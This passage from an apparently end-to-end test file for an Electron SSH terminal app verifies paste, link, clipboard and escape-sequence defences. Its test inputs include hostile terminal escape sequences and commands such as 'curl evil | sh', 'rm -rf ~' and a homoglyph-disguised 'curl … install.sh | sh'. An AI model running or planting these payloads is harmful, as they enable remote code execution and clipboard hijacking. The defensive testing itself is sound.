      check('an engine whose link ended is gone, and says so', await until(() => early.engine.state === 'gone' && early.engine.cause === 'the link ended', 5000), [early.engine.state, early.engine.cause]);
      ctx.closeTab(early.id);

      // The block was "run": the box lets this key in. A tab on the place opens a real shell there.
      const let_ = await lab.tell(`accept ${box().publicKey}`);
      check('the key is on the box', typeof let_['accepting'] === 'string', let_);
      const t = ctx.openTab(id, 'logs')!;
      const phases: string[] = [];
      const watching = setInterval(() => {
        if (phases[phases.length - 1] !== t.engine.link.phase) phases.push(t.engine.link.phase);
      }, 2);
      const up = await until(() => t.engine.link.phase === 'up', 20_000);
      clearInterval(watching);
      check('a tab on the box: the link comes up, signed in by the key process', up && t.engine.signAsked >= 1 && t.engine.signRefused === 0 && ctx.signsRefused() === 0, [t.engine.link, phases, t.engine.signAsked, t.engine.signRefused, ctx.signsRefused()]);
      check('what was agreed is the plan\'s', t.engine.link.cipher === 'aes256-gcm@openssh.com' && ['mlkem768x25519-sha256', 'curve25519-sha256'].includes(t.engine.link.keyExchange), t.engine.link);
      check('the tab says which box and place it is on', JSON.stringify(ctx.shellState().tabs.find((x) => x.id === t.id)?.box) === JSON.stringify({ id, name: 'lab-box', colour: 2, place: 'logs', addr, user: 'demo', folder: "/var/log/it's here", pinType: 'ED25519', keepsRunning: false }), ctx.shellState().tabs);
      await until(async () => (await js<string>(t.view, `document.readyState`)) === 'complete', 10_000);
      // What the box said at sign-in is folded into one line, with the real notice in it lifted onto that
      // line; nothing of it is drawn in the terminal until the line is opened.
      const foldSaid = await until(async () => (await js<string>(t.view, `document.getElementById('signin')?.textContent ?? ''`)) !== '', 5000) ? await js<string>(t.view, `document.getElementById('signin').textContent`) : '';
      check('what the box said at sign-in is one folded line, with its notice lifted onto it, and none of it drawn yet', foldSaid.includes('lab-box said 3 lines at sign-in') && foldSaid.includes('System restart required') && !(await shown(t)).includes('Welcome to the lab box'), [foldSaid, (await shown(t)).slice(0, 80)]);
      // Opened: it is drawn as words on its own lines, each control character as its picture, and the box's
      // shell is given nothing because of it.
      const PIC = (c: number) => String.fromCodePoint(0x2400 + c); // a control character's picture
      await js(t.view, `document.getElementById('signin').click()`);
      await until(async () => (await shown(t)).includes('second line'), 5000);
      await sleep(200);
      const signInText = (await shown(t)).split('\n').slice(0, 2);
      const becauseOfIt = Buffer.from(String((await lab.tell('received'))['hex'] ?? ''), 'hex').toString('latin1');
      check('opened, it is drawn as words, line by line, its control characters as pictures; nothing in it is obeyed or answered', signInText[0] === 'Welcome to the lab box' && signInText[1] === `${PIC(0x1b)}[c${PIC(0x1b)}]52;c;aGlkZGVu${PIC(7)}${PIC(0x1b)}[31msecond line` && becauseOfIt === '', [signInText, JSON.stringify(becauseOfIt)]);
      await type(t, 'typed-into-the-box-5b2');
      check('typed bytes reach the box\'s shell and its output comes back to this tab', await until(async () => (await shown(t)).includes('typed-into-the-box-5b2'), 5000), await shown(t));
      check('another tab saw none of it', !(await shown(a)).includes('typed-into-the-box'), '');
      // The file channel is opened the first time the tab's browser wants it, which is a moment after the tab
      // comes up: the box is given that moment rather than being asked while it is still one session short.
      let seenNow = await lab.tell('seen');
      await until(async () => {
        seenNow = await lab.tell('seen');
        return ((seenNow['sessions'] ?? []) as unknown[]).length >= 2;
      }, 15_000);
      const sessions = (seenNow['sessions'] ?? []) as { Asked?: string[]; Command?: string; Term?: string; Cols?: number; Rows?: number; Resizes?: [number, number][] }[];
      // What Berth asks a box for, in full, and nothing beyond it (plan B10). A tab opens two sessions and no
      // more: the terminal, and the file subsystem for its own file browser. The second asks for one thing,
      // "subsystem", and carries no terminal and no command.
      const shell = sessions.find((x) => (x.Asked ?? []).includes('pty-req'));
      const fileSession = sessions.find((x) => JSON.stringify(x.Asked) === '["subsystem"]');
      const last = shell;
      check('the box was asked for a terminal and the place\'s one start command, and nothing else', sessions.length === 2 && JSON.stringify(shell?.Asked?.slice(0, 2)) === '["pty-req","exec"]' && (shell?.Asked ?? []).slice(2).every((x) => x === 'window-change') && shell?.Command === `cd -- '/var/log/it'\\''s here' && exec "$SHELL" -l` && shell?.Term === 'xterm-256color', seenNow);
      check('and its files were asked for on a session of their own, which asks for one thing and no terminal', fileSession !== undefined && fileSession.Term === '' && fileSession.Command === '', fileSession);
      const sizeNow = await js<{ cols: number; rows: number }>(t.view, `window.berthTerm.size()`);
      // The box is told a size when the terminal opens, and after that only when the window really changes.
      // This box prints three lines at sign-in, and those words take room on screen once they land, so the
      // terminal above them really is shorter than it was a moment before and the box is told so, once. A box
      // that says nothing never moves anything and is never told twice, which is the case his own boxes are
      // (the probe for that is beside the files pictures). What must hold either way: the last size the box
      // was given is the size the window has now, or his shell wraps its lines against a size nobody has.
      const resizes = last?.Resizes ?? [];
      const toldLast = resizes.length > 0 ? resizes[resizes.length - 1]! : [last?.Cols ?? 0, last?.Rows ?? 0];
      const changes = (last?.Asked ?? []).filter((x) => x === 'window-change').length;
      check(`the box's terminal is opened at this tab's size and told again only when the window changes: it has ${sizeNow.cols} x ${sizeNow.rows} and the box was last told ${toldLast[0]} x ${toldLast[1]}`, toldLast[0] === sizeNow.cols && toldLast[1] === sizeNow.rows && sizeNow.cols > 40 && changes === resizes.length && changes <= 1, [last?.Cols, last?.Rows, sizeNow, last?.Asked, resizes]);
      const worn = await dress(t);
      check('the tab\'s page is whole: each of its stylesheets loaded, the terminal\'s typeface too, the terminal\'s own text field out of sight', dressed(worn), worn);
      check('it signed in as the box\'s user', Array.isArray(seenNow['users']) && (seenNow['users'] as string[]).every((u) => u === 'demo'), seenNow['users']);

      // ---- What a box may not do through the terminal (plan B3, B10). The box prints; the app must send back
      // nothing but the written answers, and nothing of the PC may change. The box's shell is told to stay
      // silent meanwhile, so that what it was given is exactly what the terminal sent by itself.
      await lab.tell('quiet on');
      await sleep(150);
      await lab.tell('received');
      const boxPrints = (text: string) => lab.tell(`print ${Buffer.from(text, 'latin1').toString('hex')}`);
      const boxGot = async (): Promise<string> => {
        await sleep(250);
        return Buffer.from(String((await lab.tell('received'))['hex'] ?? ''), 'hex').toString('latin1');
      };
      const ESC = '\x1b';
      const BEL = '\x07';
      const ST = `${ESC}\\`;
      const questions: [string, string, string][] = [
        ['what kind of terminal', `${ESC}[c${ESC}[0c`, `${ESC}[?1;2c${ESC}[?1;2c`],
        ['which terminal', `${ESC}[>c`, `${ESC}[>0;276;0c`],
        ['are you there', `${ESC}[5n`, `${ESC}[0n`],
        ['where is the cursor', `${ESC}[2J${ESC}[5;9H${ESC}[6n${ESC}[?6n`, `${ESC}[5;9R${ESC}[?5;9R`],
        ['is this mode on', `${ESC}[?2004$p${ESC}[?2004h${ESC}[?2004$p${ESC}[?2004l${ESC}[?31337$p`, `${ESC}[?2004;2$y${ESC}[?2004;1$y${ESC}[?31337;0$y`],
      ];
      const wrongAnswers: string[] = [];
      for (const [what, printed, want] of questions) {
        await boxPrints(printed);
        const back = await boxGot();
        if (back !== want) wrongAnswers.push(`${what}: sent ${JSON.stringify(back)}, the list says ${JSON.stringify(want)}`);
      }
      check(`the terminal's ${questions.length} written answers are exactly what the list says`, wrongAnswers.length === 0, wrongAnswers);

      clipboard.writeText('what-was-on-the-clipboard');
      const titleBefore = ctx.win.getTitle();
      const boundsBefore = JSON.stringify(ctx.win.getBounds());
      const labelBefore = await text(`[data-tab="${t.id}"]`);
      const refusedOnes: [string, string][] = [
        ['a third kind of "which terminal"', `${ESC}[=c`],
        ['the title set to a command, then asked back', `${ESC}]0;rm -rf ~${BEL}${ESC}]2;curl evil | sh${BEL}${ESC}[21t${ESC}[20t`],
        ['the window asked about, moved and sized', `${ESC}[14t${ESC}[16t${ESC}[18t${ESC}[19t${ESC}[13t${ESC}[11t${ESC}[3;0;0t${ESC}[8;10;10t${ESC}[4;200;200t${ESC}[2t${ESC}[9;1t`],
        ['"say back your settings"', `${ESC}P$qm${ST}${ESC}P$q"p${ST}${ESC}P$qr${ST}${ESC}P$q q${ST}`],
        ['"say back your abilities" and "name yourself"', `${ESC}P+q544e${ST}${ESC}[>q${ESC}[>0q`],
        ['colours asked for, and set', `${ESC}]10;?${BEL}${ESC}]11;?${BEL}${ESC}]12;?${BEL}${ESC}]4;1;?${BEL}${ESC}]11;#ff0000${BEL}${ESC}]4;1;#00ff00${BEL}${ESC}]104${BEL}${ESC}]110${BEL}`],
        ['the clipboard written, and asked for', `${ESC}]52;c;${Buffer.from('curl evil | sh\n').toString('base64')}${BEL}${ESC}]52;c;?${BEL}${ESC}]52;p;?${BEL}`],
        ['"who are you" (ENQ), and the other form of the mode question', `\x05${ESC}[4$p${ESC}[20$p`],
        ['a link hidden behind other words', `${ESC}]8;;http://203.0.113.9/get${BEL}click here${ESC}]8;;${BEL}`],
      ];
      const leaked: string[] = [];
      for (const [what, printed] of refusedOnes) {
        await boxPrints(printed);
        const back = await boxGot();
        if (back !== '') leaked.push(`${what}: the terminal sent ${JSON.stringify(back)}`);
      }
      check(`${refusedOnes.length} kinds of question and command a box may not use get no answer at all`, leaked.length === 0, leaked);
      // A program may ask to be told when the window gains or loses focus; it is then told at once whether it
      // has it now. That report is fixed text. Asking for the mouse, or for protected paste, sends nothing by itself.
      await boxPrints(`${ESC}[?1000h${ESC}[?1006h${ESC}[?2004h`);
      const quietModes = await boxGot();
      await boxPrints(`${ESC}[?1004h`);
      const focusSaid = await boxGot();
      check('asking for mouse reports sends nothing by itself; asking for focus reports is answered with the focus now, and nothing else', quietModes === '' && (focusSaid === `${ESC}[I` || focusSaid === `${ESC}[O` || focusSaid === ''), [JSON.stringify(quietModes), JSON.stringify(focusSaid)]);
      check('and nothing of the PC changed: the clipboard, the window\'s title, size and place, the tab\'s label', (await clipboard.readText()) === 'what-was-on-the-clipboard' && ctx.win.getTitle() === titleBefore && JSON.stringify(ctx.win.getBounds()) === boundsBefore && (await text(`[data-tab="${t.id}"]`)) === labelBefore, [await clipboard.readText(), ctx.win.getTitle(), await text(`[data-tab="${t.id}"]`)]);
      // The words that came with a hidden link: the pointer is moved onto them. Over a link it would turn
      // into a hand; over plain words it does not.
      const words = await js<{ x: number; y: number; hand: boolean } | null>(t.view, `window.berthTerm.spot('click here')`);
      if (words) t.view.webContents.sendInputEvent({ type: 'mouseMove', x: words.x, y: words.y });
      await sleep(400);
      const over = await js<{ x: number; y: number; hand: boolean } | null>(t.view, `window.berthTerm.spot('click here')`);
      const drawn = await js<{ links: number; shown: boolean; faults: string[] }>(t.view, `({ links: document.querySelectorAll('#term a').length, shown: window.berthTerm.text().includes('click here'), faults: window.berthTerm.policyFaults() })`);
      check('the hidden link is plain words with nothing behind them, also under the pointer; the page\'s own policy was never broken', drawn.links === 0 && drawn.shown && drawn.faults.length === 0 && over !== null && !over.hand, [drawn, over]);
      await boxPrints(`${ESC}[?1004l${ESC}[?1000l${ESC}[?1006l${ESC}[?2004l${ESC}[2J${ESC}[H`);

      // ---- Paste (plan B2.7, B3). The clipboard is read by main, and only for a paste a person made. ----
      // The terminal's own paste is not Berth's: a paste or drop in the page, and a paste command sent to the
      // page, put nothing on the box. Only a key, or a click, that main itself saw does.
      clipboard.writeText('echo this-came-from-the-page');
      t.view.webContents.focus();
      t.view.webContents.paste();
      await js(t.view, `(() => { const el = document.querySelector('#term textarea'); for (const type of ['paste', 'drop']) { const d = new DataTransfer(); d.setData('text/plain', 'echo this-came-from-the-page'); el.dispatchEvent(type === 'paste' ? new ClipboardEvent('paste', { clipboardData: d, bubbles: true, cancelable: true }) : new DragEvent('drop', { dataTransfer: d, bubbles: true, cancelable: true })); } })()`);
      const fromPage = await boxGot();
      check('a paste the page makes itself, and a paste command sent to the page, put nothing on the box', !fromPage.includes('came-from-the-page') && fromPage.replace(/\x16/g, '') === '', JSON.stringify(fromPage));

      // A paste key main saw, on one line with nothing hidden in it: it goes straight to the box, as typed.
      const pasteKey = async (on: Tab, keyCode = 'V', modifiers: ('control' | 'shift')[] = ['control', 'shift']) => {
        on.view.webContents.focus();
        on.view.webContents.sendInputEvent({ type: 'keyDown', keyCode, modifiers });
        on.view.webContents.sendInputEvent({ type: 'keyUp', keyCode, modifiers });
        await sleep(250);
      };
      clipboard.writeText('one-line-paste-7b2');
      await pasteKey(t);
      const oneLine = await boxGot();
      check('a paste key main saw, one line: the text goes to the box, once and exactly', oneLine === 'one-line-paste-7b2', JSON.stringify(oneLine));
      // A second tab on the same box, put behind: a paste key in it reaches nothing, though its box is live
      // and its own view is focused. Nor does one while a dialog of the shell's is over the tab in front.
      const tBehind = ctx.openTab(id, '')!;
      await until(() => tBehind.engine.link.phase === 'up', 20_000);
      await js(ctx.shell, `window.shellPort.cmd({ op: 'select', id: ${t.id} })`);
      await until(() => ctx.shellState().active === t.id, 2000);
      clipboard.writeText('not-from-a-tab-behind');
      await pasteKey(tBehind);
      const behind = await boxGot();
      check('a paste key in a tab that is not in front puts nothing on the box, though its own link is up', behind === '' && tBehind.engine.link.phase === 'up', [JSON.stringify(behind), tBehind.engine.link.phase]);
      await js(ctx.shell, `window.shellPort.cmd({ op: 'overlay', on: true })`);
      clipboard.writeText('not-from-under-a-dialog');
      await pasteKey(t);
      const pasteUnderDialog = await boxGot();
      await js(ctx.shell, `window.shellPort.cmd({ op: 'overlay', on: false })`);
      check('and none while a dialog or menu of the window is over the tab in front', pasteUnderDialog === '', JSON.stringify(pasteUnderDialog));
      ctx.closeTab(tBehind.id);
      await sleep(200);
      await boxGot();

      // More than one line: nothing is sent on the key. It is shown first, on the shell, where no tab draws.
      clipboard.writeText('echo first-line\nsha256sum /srv/x.tar.gz\n');
      await pasteKey(t);
      const beforeShown = await boxGot();
      const shownOk = await until(() => has('#paste'), 3000);
      check('a paste of more than one line is not sent on the key: it is shown first, on the shell', beforeShown === '' && shownOk && (await text('#paste')).includes('2 lines to lab-box') && (await text('#paste')).includes('the last line runs on arrival'), [JSON.stringify(beforeShown), await text('#paste')]);
      const shellAbove = () => { const kids = ctx.win.contentView.children; return kids[kids.length - 1] === ctx.shell; };
      check('and the shell is above the tabs while it is shown', await until(shellAbove, 1000), '');
      await clickOn('#paste-drop');
      const afterDrop = await boxGot();
      check("Don't send: nothing reaches the box, and the window says so", !(await has('#paste')) && afterDrop === '' && (await text('#status-done')).includes('not sent'), [afterDrop, await text('#status-done')]);

      // Shown again and sent: exactly what was shown arrives, with its line endings, and nothing else.
      await pasteKey(t);
      await until(() => has('#paste'), 3000);
      await clickOn('#paste-send');
      const sent = await boxGot();
      check('Send: exactly what was shown reaches the box, line endings and all', (await until(async () => !(await has('#paste')), 2000)) && sent === 'echo first-line\nsha256sum /srv/x.tar.gz\n', JSON.stringify(sent));
      // A paste that does not end in a line ending leaves its last line typed, and says so.
      clipboard.writeText('tail -n 40 /var/log/syslog');
      await pasteKey(t);
      const typedNotRun = await boxGot();
      check('a paste of one line with no line ending goes straight through, and the box is not told to run it', typedNotRun === 'tail -n 40 /var/log/syslog', JSON.stringify(typedNotRun));
      clipboard.writeText('cd /srv\ntail -n 40 /var/log/syslog');
      await pasteKey(t);
      await until(() => has('#paste'), 3000);
      check('and one of two lines with no line ending at the end says the last line is left typed, not run', (await text('#paste')).includes('the last line is left typed, not run'), await text('#paste'));
      await clickOn('#paste-drop');
      await boxGot();

      // What a paste may not carry: every control character is taken out, the escape character with them, so
      // nothing in a paste can be a terminal's own instruction or the end of a protected paste.
      // No null character here on purpose: Windows ends clipboard text at one, so it could never reach the
      // app through a clipboard at all. What happens to it is proven where it can be: tests/paste.test.ts.
      clipboard.writeText(`a\x1b[201~b\x07cd\re\nf\x1b]52;c;bad\x07g`);
      await pasteKey(t);
      await until(() => has('#paste'), 3000);
      const taken = await text('#paste-taken');
      await clickOn('#paste-send');
      const noControls = await boxGot();
      check('a paste carries no control character at all: not the end of a protected paste, not a bell, nothing', noControls === 'a[201~bcd\ne\nf]52;c;badg', [JSON.stringify(noControls), taken]);
      check('and the window says how many were taken out, and a lone carriage return became a line ending', taken.includes('4 control characters taken out') && noControls.split('\n').length === 3, [taken, noControls.split('\n').length]);

      // A paste that holds what cannot be seen: it is named, line and character, before anything is sent.
      clipboard.writeText('curl https://exaаmple.test/i​nstall.sh | sh\n');
      await pasteKey(t);
      await until(() => has('#paste'), 3000);
      const odd = await text('#paste-odd');
      check('a character that looks like a letter, and one drawn as nothing, are both named with where they are', odd.includes('looks like a') && odd.includes('drawn as nothing') && /line 1, character \d+/.test(odd), odd.slice(0, 200));
      await clickOn('#paste-drop');
      await boxGot();

      // ---- An address a box printed (plan B2.7). Nothing a box prints opens by itself. ----
      // The box prints a line with an address in it. A plain click on it opens nothing at all.
      await lab.tell('quiet off');
      await sleep(200);
      await type(t, 'echo see https://demo-eu.example.test/runbook#step-4 for the rest\n');
      await until(async () => (await shown(t)).includes('demo-eu.example.test'), 5000);
      await sleep(300);
      const atUrl = await js<{ x: number; y: number } | null>(t.view, `window.berthTerm.spot('demo-eu.example.test')`);
      const openedBefore = ctx.opened().asked;
      if (atUrl) {
        t.view.webContents.sendInputEvent({ type: 'mouseMove', x: atUrl.x, y: atUrl.y });
        await sleep(200);
        t.view.webContents.sendInputEvent({ type: 'mouseDown', x: atUrl.x, y: atUrl.y, button: 'left', clickCount: 1 });
        t.view.webContents.sendInputEvent({ type: 'mouseUp', x: atUrl.x, y: atUrl.y, button: 'left', clickCount: 1 });
      }
      await sleep(400);
      check('a plain click on an address a box printed opens nothing and asks nothing', !!atUrl && !(await has('#link')) && ctx.opened().asked === openedBefore, [!!atUrl, await has('#link')]);
      // Ctrl+click asks, on the window's own surface, with the host and the whole address.
      if (atUrl) {
        t.view.webContents.sendInputEvent({ type: 'mouseMove', x: atUrl.x, y: atUrl.y, modifiers: ['control'] });
        await sleep(150);
        t.view.webContents.sendInputEvent({ type: 'mouseDown', x: atUrl.x, y: atUrl.y, button: 'left', clickCount: 1, modifiers: ['control'] });
        t.view.webContents.sendInputEvent({ type: 'mouseUp', x: atUrl.x, y: atUrl.y, button: 'left', clickCount: 1, modifiers: ['control'] });
      }
      const linkAsked = await until(() => has('#link'), 3000);
      const linkSaid = await text('#link');
      check('Ctrl+click asks first, on the window\'s own surface, naming the box and showing the host and the whole address', linkAsked && linkSaid.includes('Open demo-eu.example.test in the browser?') && linkSaid.includes('lab-box') && (await text('#link-url')) === 'https://demo-eu.example.test/runbook#step-4' && ctx.opened().asked === openedBefore, [linkSaid.slice(0, 160), await text('#link-url')]);
      await clickOn('#link-drop');
      check("Don't open: nothing is opened, and the window says so", (await until(async () => !(await has('#link')), 2000)) && ctx.opened().asked === openedBefore && (await text('#status-done')).includes('not opened'), [ctx.opened().asked - openedBefore, await text('#status-done')]);

      // Open: exactly the address that was shown is handed over, and nothing else.
      if (atUrl) {
        t.view.webContents.sendInputEvent({ type: 'mouseDown', x: atUrl.x, y: atUrl.y, button: 'left', clickCount: 1, modifiers: ['control'] });
        t.view.webContents.sendInputEvent({ type: 'mouseUp', x: atUrl.x, y: atUrl.y, button: 'left', clickCount: 1, modifiers: ['control'] });
      }
      await until(() => has('#link'), 3000);
      await clickOn('#link-open');
      await sleep(300);
      check('Open: the address handed to the browser is the one that was shown, to the character', ctx.opened().asked === openedBefore + 1 && ctx.opened().url === 'https://demo-eu.example.test/runbook#step-4', ctx.opened());

      // What a box prints that is not an address to open: nothing becomes clickable at all.
      const refusedBefore = ctx.opened().refused;
      // One kind to a line, each line short: a narrower window puts the end of a long line on the next row,
      // and what is asked here is what the app makes of the row a thing is drawn on.
      // Each ends with a carriage return as well as a newline, which is what a terminal gets from a real
      // shell: without it the lab's box echoes a newline alone, every line starts further right than the
      // last, and a line eventually wraps in the middle of the very words being looked for.
      await type(t, 'echo file:///etc/shadow\r\n');
      await until(async () => (await shown(t)).includes('file:///etc'), 5000);
      await type(t, 'echo ftp://x.test/y\r\n');
      await until(async () => (await shown(t)).includes('ftp://x.test'), 5000);
      await type(t, 'echo javascript:void(0)\r\n');
      await until(async () => (await shown(t)).includes('javascript:void'), 5000);
      // What the app itself treats as an address to open, asked of the app, row by row.
      const onRow = async (words: string): Promise<string[]> => {
        // Waited for, not slept at: the line is drawn when the view next paints, and how long that takes is
        // the machine's business. A flat wait here passed on one machine and lost the race on a slower one.
        await until(async () => (await js<unknown>(t.view, `window.berthTerm.spot(${JSON.stringify(words)})`)) !== null, 10_000);
        const where = await js<{ x: number; y: number } | null>(t.view, `window.berthTerm.spot(${JSON.stringify(words)})`);
        if (!where) return ['(not drawn)'];
        const row = await js<number>(t.view, `(() => { const s = document.querySelector('.xterm-screen').getBoundingClientRect(); const t = window.berthTerm.size(); return Math.floor((${where.y} - s.top) / (s.height / t.rows)) + 1; })()`);
        return js<string[]>(t.view, `window.berthTerm.links(${row})`);
      };
      const otherKinds = [await onRow('file:///etc'), await onRow('ftp://x.test'), await onRow('javascript:void')];
      const tail = (await js<string>(t.view, `window.berthTerm.text()`)).split('\n').slice(-6).join(' | ');
      check('a file, a script, or any address of another kind a box prints is not a link at all', JSON.stringify(otherKinds) === '[[],[],[]]', [otherKinds, tail]);
      check('and the address that is one is the whole address, and only it', JSON.stringify(await onRow('demo-eu.example.test')) === JSON.stringify(['https://demo-eu.example.test/runbook#step-4']), await onRow('demo-eu.example.test'));
      check('nothing was opened or asked by any of it', !(await has('#link')) && ctx.opened().asked === openedBefore + 1 && ctx.opened().refused === refusedBefore, [await has('#link'), ctx.opened()]);
      await lab.tell('quiet on');
      await sleep(150);
      await boxGot();

      // A box that asked to be told where a paste begins gets the markers; one that did not, gets the text.
      await boxPrints(`${ESC}[?2004h`);
      await sleep(400);
      clipboard.writeText('two\nlines\n');
      await pasteKey(t);
      await until(() => has('#paste'), 3000);
      const saidProtected = (await text('#paste')).includes('asked to be told where a paste begins');
      await clickOn('#paste-send');
      const wrapped = await boxGot();
      check('a box that asked to be told where a paste begins is sent the markers around it, and is told so', wrapped === `${ESC}[200~two\nlines\n${ESC}[201~` && saidProtected, [JSON.stringify(wrapped), saidProtected]);
      await boxPrints(`${ESC}[?2004l`);
      await sleep(400);

      // Select to copy: only the tab in front of the window in use may leave text on the clipboard.
      // The window has to be in use before any of this is asked, or every refusal below would be the window
      // being out of use and not the rule each probe is here to prove. Asking for focus is not getting it, so
      // this waits for the window to say it has focus rather than guessing at a length of time.
      const frontTab = ctx.tabs.get(ctx.shellState().active)!;
      ctx.win.focus();
      const inUse = await until(() => ctx.win.isFocused(), 4000);
      clipboard.writeText('untouched');
      await js(a.view, `window.tabPort.copy('from a tab that is not in front')`);
      await sleep(150);
      check('a tab that is not in front cannot put text on the clipboard', inUse && (await clipboard.readText()) === 'untouched', [await clipboard.readText(), inUse]);
      // The tab in front can, and the window says what was copied; not while a dialog or menu is over it; and
      // never more than the limit.
      await js(ctx.shell, `window.shellPort.cmd({ op: 'overlay', on: true })`);
      await js(frontTab.view, `window.tabPort.copy('from under a dialog')`);
      await sleep(150);
      const underDialog = await clipboard.readText();
      await js(ctx.shell, `window.shellPort.cmd({ op: 'overlay', on: false })`);
      const droppedBeforeCopy = ctx.dropped();
      await js(frontTab.view, `window.tabPort.copy('x'.repeat(${COPY_MAX} + 1))`);
      await sleep(400);
      const tooMuch = await clipboard.readText();
      refusedByTheLock++;
      check('a tab under a dialog cannot either; and more than the limit at once is refused whole', inUse && underDialog === 'untouched' && tooMuch === 'untouched' && ctx.dropped() === droppedBeforeCopy + 1, [underDialog.slice(0, 40), tooMuch.length, ctx.dropped() - droppedBeforeCopy, inUse]);
      ctx.win.focus();
      const stillInUse = await until(() => ctx.win.isFocused(), 4000);
      await js(frontTab.view, `window.tabPort.copy('one\\ntwo')`);
      await sleep(250);
      check('the tab in front of the window in use can: the text is on the clipboard, and the window says what was copied', stillInUse && (await clipboard.readText()) === 'one\ntwo' && (await text('#status')).includes('Copied 2 lines'), [await clipboard.readText(), await text('#status'), stillInUse]);
      // The window's own keys. Which tab is in front is the window's business, not a box's, so main answers
      // these presses before any view is given them: they work the same wherever the focus is, and a box is
      // never sent them.
      const press = (w: Electron.WebContents, keyCode: string, modifiers: ('control' | 'shift' | 'alt')[]): void => {
        w.sendInputEvent({ type: 'keyDown', keyCode, modifiers });
        w.sendInputEvent({ type: 'keyUp', keyCode, modifiers });
      };
      // A window key is refused outright when the window is not the one in use, and that refusal is right.
      // So the window is put in use and that is waited for before any of these presses: without it a probe
      // about which tab is in front would quietly become a probe about how the machine hands out focus, and
      // would fail saying the key did nothing when what really happened is that it was never ours to act on.
      ctx.win.focus();
      const inUseForKeys = await until(() => ctx.win.isFocused() && !ctx.overlayOn(), 4000);
      // A machine that will not put the window in use cannot be asked about window keys at all: every press
      // would be refused for the right reason and every probe would fail saying the key did nothing. That is
      // said once, in those words, rather than four failures that read as the app's (a Windows runner with
      // no desktop to give focus to is exactly such a machine).
      // Both of the reasons main refuses a window key are said in each detail below, so a failure here names
      // which of them it was rather than leaving it to be guessed at.
      const keysCouldWork = (): unknown[] => [`in use: ${ctx.windowInUse()}`, `a dialog over it: ${ctx.overlayOn()}`];
      if (!inUseForKeys) check('the window keys: this machine would not put the window in use, so nothing was asked of the app', true, keysCouldWork());
      const ids = [...ctx.tabs.keys()];
      const nextAlong = ids[(ids.indexOf(t.id) + 1) % ids.length]!;
      await boxGot();
      const keysRefusedBefore = ctx.keysRefused();
      // The page is asked to write down any key it is given, so the rule being proved is the real one: main
      // answers these presses and no view is ever given them, rather than the view simply making nothing of it.
      await js(t.view, `(window.__keysSeen = [], document.addEventListener('keydown', (e) => window.__keysSeen.push(e.key), true))`);
      press(t.view.webContents, 'Tab', ['control']);
      const moved = await until(() => ctx.shellState().active === nextAlong, 2000);
      const keyToBox = await boxGot();
      const pageSaw = await js<string[]>(t.view, `window.__keysSeen`);
      check('Ctrl+Tab, pressed in the terminal, moves to the next tab, and neither the page nor the box is given it', !inUseForKeys || (moved && ids.length > 1 && keyToBox === '' && pageSaw.length === 0 && ctx.keysRefused() === keysRefusedBefore), [inUseForKeys, ...keysCouldWork(), ids.length, ctx.shellState().active, nextAlong, JSON.stringify(keyToBox), pageSaw]);
      press(t.view.webContents, 'Tab', ['control', 'shift']);
      check('and Ctrl+Shift+Tab moves back the other way', !inUseForKeys || (await until(() => ctx.shellState().active === t.id, 2000)), [inUseForKeys, ...keysCouldWork(), ctx.shellState().active, t.id]);
      press(t.view.webContents, '1', ['control', 'alt']);
      const toTheFirst = await until(() => ctx.shellState().active === ids[0], 2000);
      press(t.view.webContents, '9', ['control', 'alt']);
      const toTheLast = await until(() => ctx.shellState().active === ids[ids.length - 1], 2000);
      check('Ctrl+Alt and a number reaches that tab, and 9 is the last one however many there are', !inUseForKeys || (toTheFirst && toTheLast && ids.length > 1), [inUseForKeys, ...keysCouldWork(), toTheFirst, toTheLast, ids.length]);
      // A number past the last tab: nothing moves, and the window says there is no such tab rather than
      // leaving the press unanswered.
      const whereItWas = ctx.shellState().active;
      press(t.view.webContents, '8', ['control', 'alt']);
      await sleep(250);
      check('a number past the last tab moves nothing, and the window says there is no such tab', !inUseForKeys || (ctx.shellState().active === whereItWas && (await text('#status')).includes('There is no tab 8') && ids.length < 8), [ctx.shellState().active === whereItWas, await text('#status'), ids.length]);
      // Ctrl+Shift+A: the whole terminal on the clipboard, and the press never reaching the box. Ctrl+A is
      // the shell's own and must still go straight through to it.
      {
        // The tab this is about is put in front first: the presses before this one moved between tabs, and
        // what Ctrl+Shift+A copies is the tab he is looking at, not the one a probe happens to hold.
        await js(ctx.shell, `window.shellPort.cmd({ op: 'select', id: ${t.id} })`);
        await until(() => ctx.shellState().active === t.id, 5000);
        // Whether the window is in use is asked here, not once at the top of all the key probes: a machine
        // that hands out focus can take it away again between one press and the next, and a precondition
        // read long before the press it guards turns a probe about the app into a probe about the machine.
        // Asked again before every press, not once for the group: this block makes four presses over
        // several seconds, and a machine that hands out focus can take it back between any two of them.
        const stillInUse = async (): Promise<boolean> => {
          ctx.win.focus();
          return await until(() => ctx.win.isFocused() && !ctx.overlayOn(), 4000);
        };
        const inUse = await stillInUse();
        const before = await clipboard.readText();
        const boxBefore = await boxGot();
        press(t.view.webContents, 'A', ['control', 'shift']);
        const copiedWhole = await until(async () => (await clipboard.readText()) !== before, 5000);
        const onClipboard = await clipboard.readText();
        const boxAfter = await boxGot();
        check(
          'Ctrl+Shift+A copies the whole terminal, and the box is given nothing',
          !inUse || (copiedWhole && onClipboard.length > 40 && boxAfter === ''),
          [inUse, ...keysCouldWork(), copiedWhole, onClipboard.length, JSON.stringify(boxAfter), JSON.stringify(boxBefore)],
        );
        // Ctrl+Shift+S: the same terminal into a file he picks. The page hands over the text; where it goes
        // is asked by main, and the lab answers that chooser here because it cannot press its buttons.
        {
          const there = (f: string): Promise<boolean> => stat(f).then(() => true, () => false);
          const into = path.join(os.tmpdir(), `berth-saved-${randomBytes(5).toString('hex')}.txt`);
          ctx.savesTo(() => into);
          const clipBeforeSave = await clipboard.readText();
          const useSave = await stillInUse();
          press(t.view.webContents, 'S', ['control', 'shift']);
          // Waiting on the window's own word, not on the file appearing: a file exists from the first byte
          // written, and reading it then is reading something half written.
          const written = (await until(() => ctx.shellState().done.startsWith('Saved '), 5000)) && (await there(into));
          const held = written ? await readFile(into, 'utf8') : '';
          check('Ctrl+Shift+S saves the whole terminal into the file he picked, and the box is given nothing', !useSave || (written && held.length > 40 && held.startsWith(onClipboard.slice(0, 60)) && (await boxGot()) === ''), [useSave, ...keysCouldWork(), written, held.length, onClipboard.length]);
          check('saving leaves the clipboard exactly as it was: it is a file, not a copy', !useSave || (await clipboard.readText()) === clipBeforeSave, [clipBeforeSave.length, (await clipboard.readText()).length]);
          check('and the window says what was saved, naming the file', !useSave || (ctx.shellState().done.startsWith('Saved ') && ctx.shellState().done.includes(path.basename(into))), ctx.shellState().done);
